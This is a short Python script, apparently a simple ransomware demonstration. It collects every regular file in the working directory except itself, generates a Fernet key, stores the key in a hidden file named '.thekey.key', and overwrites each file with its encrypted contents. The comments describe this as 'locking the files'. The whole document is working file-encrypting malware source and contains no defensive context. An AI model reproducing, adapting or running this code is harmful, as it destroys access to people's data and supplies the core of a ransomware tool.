#!/usr/bin/env python3


import os
from cryptography.fernet import Fernet

# discovering documents

files = []

for file in os.listdir():
        if file == "this_document.py":
                continue
        if os.path.isfile(file):
                files.append(file)



#generating encryption key

key = Fernet.generate_key()

with open(".thekey.key", "wb") as thekey:
        thekey.write(key)

# locking the files
#rb = read binary and wb= write binary
#we are reading the files in binary encrypting them with fernet and writing the contents back to the file encrypted with our key
for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)
